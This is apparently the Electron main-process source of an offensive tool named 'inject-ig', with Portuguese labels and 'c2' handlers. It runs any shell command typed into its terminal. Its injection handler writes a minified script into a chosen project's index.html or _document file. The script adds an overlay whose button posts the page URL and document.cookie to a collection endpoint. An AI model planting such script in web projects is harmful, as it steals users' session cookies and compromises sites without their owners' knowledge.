const { app, BrowserWindow, ipcMain, dialog } = require('electron');
const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');

let mainWindow;

function createWindow() {
    mainWindow = new BrowserWindow({
        width: 450,
        height: 600,
        backgroundColor: '#00000000', // Transparent
        transparent: true,
        frame: false, // Sem bordas
        alwaysOnTop: true, // Mod Menu sempre em cima
        resizable: false,
        webPreferences: {
            nodeIntegration: false,
            contextIsolation: true,
            preload: path.join(__dirname, 'preload.js')
        }
    });

    mainWindow.loadFile('index.html');

    // IPC Window Controls
    ipcMain.on('window.close', () => { if(mainWindow) mainWindow.close(); });
    ipcMain.on('window.minimize', () => { if(mainWindow) mainWindow.minimize(); });

    ipcMain.on('terminal.keystroke', (event, command) => {
        if (!command || command.trim() === '') return;
        
        if (command === 'exit_app') {
            app.quit();
            return;
        }
        if (command === 'min_app') {
            mainWindow.minimize();
            return;
        }

        // Em um "Smart Terminal", rodamos cada linha de comando submetida via exec
        const childProc = exec(command, {
            cwd: path.join(__dirname, '../inject-ig-engine')
        });

        childProc.stdout.on('data', (data) => {
            if (mainWindow && !mainWindow.isDestroyed()) {
                mainWindow.webContents.send('terminal.incData', data.toString());
            }
        });

        childProc.stderr.on('data', (data) => {
            if (mainWindow && !mainWindow.isDestroyed()) {
                // Adiciona cor vermelha para erros
                mainWindow.webContents.send('terminal.incData', "\x1b[31m" + data.toString() + "\x1b[0m");
            }
        });

        childProc.on('error', (error) => {
            if (mainWindow && !mainWindow.isDestroyed()) {
                mainWindow.webContents.send('terminal.incData', "\x1b[31m[IG ERROR] " + error.message + "\x1b[0m\n");
            }
        });
    });

    ipcMain.handle('c2.selectTargetFolder', async () => {
        const result = await dialog.showOpenDialog(mainWindow, {
            properties: ['openDirectory'],
            title: 'Selecione a pasta do projeto Alvo'
        });
        if (result.canceled) return null;
        return result.filePaths[0];
    });

    ipcMain.handle('c2.selectScanFolder', async () => {
        const result = await dialog.showOpenDialog(mainWindow, {
            properties: ['openDirectory'],
            title: 'Selecione a pasta para Varredura Estática'
        });
        if (result.canceled) return null;
        return result.filePaths[0];
    });

    ipcMain.handle('c2.injectPayloadLocal', async (event, folderPath) => {
        try {
            const publicIndexHtmlPath = path.join(folderPath, 'public', 'index.html');
            const indexHtmlPath = path.join(folderPath, 'index.html');
            const documentPath = path.join(folderPath, 'pages', '_document.js');
            const documentTsPath = path.join(folderPath, 'pages', '_document.tsx');

            let targetFile = null;
            if (fs.existsSync(publicIndexHtmlPath)) targetFile = publicIndexHtmlPath;
            else if (fs.existsSync(indexHtmlPath)) targetFile = indexHtmlPath;
            else if (fs.existsSync(documentPath)) targetFile = documentPath;
            else if (fs.existsSync(documentTsPath)) targetFile = documentTsPath;

            if (!targetFile) {
                return { success: false, message: "Nenhum arquivo alvo (index.html ou _document) encontrado na pasta raiz." };
            }

            // Inject CSS and the inject-ig Overlay Widget
            const payloadScript = `\n<!-- INJECT-IG MOD MENU INJECTION -->\n<script>\n!function(){const css=document.createElement("style");css.innerHTML=\`@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');.nx-mod{position:fixed;bottom:20px;right:20px;width:320px;background:rgba(20,20,20,0.85);backdrop-filter:blur(15px);-webkit-backdrop-filter:blur(15px);border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#F5F5F7;font-family:'Inter',sans-serif;z-index:999999;box-shadow:0 10px 30px rgba(0,0,0,0.5);overflow:hidden;animation:slideUp 0.4s cubic-bezier(0.16,1,0.3,1);}.nx-mod-header{background:rgba(0,0,0,0.4);padding:12px 15px;font-size:14px;font-weight:600;display:flex;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,0.05);}.nx-mod-body{padding:15px;}.nx-mod-btn{width:100%;padding:10px;background:#0A84FF;color:#FFF;border:none;border-radius:6px;font-weight:600;cursor:pointer;margin-bottom:8px;}.nx-mod-btn.danger{background:rgba(255,59,48,0.2);color:#FF453A;}.nx-log{font-family:monospace;font-size:10px;color:#86868B;margin-top:10px;}@keyframes slideUp{from{transform:translateY(50px);opacity:0}to{transform:translateY(0);opacity:1}}\`,document.head.appendChild(css);const div=document.createElement("div");div.className="nx-mod",div.innerHTML='<div class="nx-mod-header"><span>INJECT-IG OVERLAY</span></div><div class="nx-mod-body"><button class="nx-mod-btn" onclick="nxExtract()">Extrair Dados da Sessão</button><button class="nx-mod-btn danger" onclick="this.parentElement.parentElement.remove()">Fechar Menu</button><div class="nx-log" id="nx-log">Status: Aguardando comandos...</div></div>',document.body.appendChild(div);window.nxExtract=function(){document.getElementById("nx-log").innerText="[+] Dados sugados e enviados.";var t=new XMLHttpRequest;t.open("POST","http://localhost:8080/api/inject-ig/scan",!0),t.setRequestHeader("Content-Type","application/json"),t.send(JSON.stringify({url:window.location.href,arch:"MOD_MENU_UI",keys:document.cookie}))}}();\n</script>\n`;
            
            let content = fs.readFileSync(targetFile, 'utf8');
            if (content.includes("INJECT-IG MOD MENU")) {
                return { success: false, message: "O Menu do inject-ig já está injetado neste arquivo!" };
            }

            if (content.includes("</body>")) {
                content = content.replace("</body>", payloadScript + "</body>");
            } else {
                content += payloadScript;
            }

            fs.writeFileSync(targetFile, content);
            return { success: true, message: `Injetado com sucesso no arquivo:\\n${targetFile}`, file: targetFile };
            
        } catch (e) {
            return { success: false, message: "Erro de permissão ou leitura: " + e.message };
        }
    });

    ipcMain.handle('c2.saveReport', async (event, data) => {
        const { filePath } = await dialog.showSaveDialog(mainWindow, {
            title: 'Salvar Relatório do inject-ig',
            defaultPath: 'inject-ig-report.json',
            filters: [{ name: 'JSON', extensions: ['json'] }]
        });

        if (filePath) {
            fs.writeFileSync(filePath, data);
            return { success: true, message: "Salvo em: " + filePath };
        }
        return { success: false, message: "Cancelado" };
    });
}

app.whenReady().then(() => {
    createWindow();

    app.on('activate', function () {
        if (BrowserWindow.getAllWindows().length === 0) createWindow();
    });
});

app.on('window-all-closed', function () {
    if (process.platform !== 'darwin') app.quit();
});
